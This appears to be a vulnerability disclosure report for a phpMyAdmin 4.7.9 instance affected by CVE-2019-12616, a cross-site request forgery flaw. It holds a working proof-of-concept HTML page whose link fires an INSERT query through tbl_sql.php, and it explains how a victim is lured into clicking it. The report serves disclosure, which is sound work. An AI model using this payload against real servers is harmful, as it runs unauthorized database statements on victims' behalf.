

# PhpMyAdmin instance vulnerable to CVE-2019-12616


## Summary
An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.

Installed version 4.7.9 (check screenshot) which is vulnerable (phpMyAdmin <= 4.9.0)  

## Steps To Reproduce

PhpMyAdmin endpoint  
* $URL

Create a HTML file with the following content
```
<html>
<head>
  <title>POC CVE-2019-12616</title>
</head>
<body>
<a href="$URL/tbl_sql.php?sql_query=INSERT+INTO+`pma__bookmark`+(`id`%2C+`dbase`%2C+`user`%2C+`label`%2C+`query`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark">View my Pictures!</a>
</body>
</html>
```

An attacker can create a page using the above HTML code, trick the victim into clicking the URL and performing Insert/Delete actions to the database. 


## Impact
An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page.

 
### Supporting Material/References
* https://nvd.nist.gov/vuln/detail/CVE-2019-12616
* **Exploit** https://www.exploit-db.com/exploits/46982

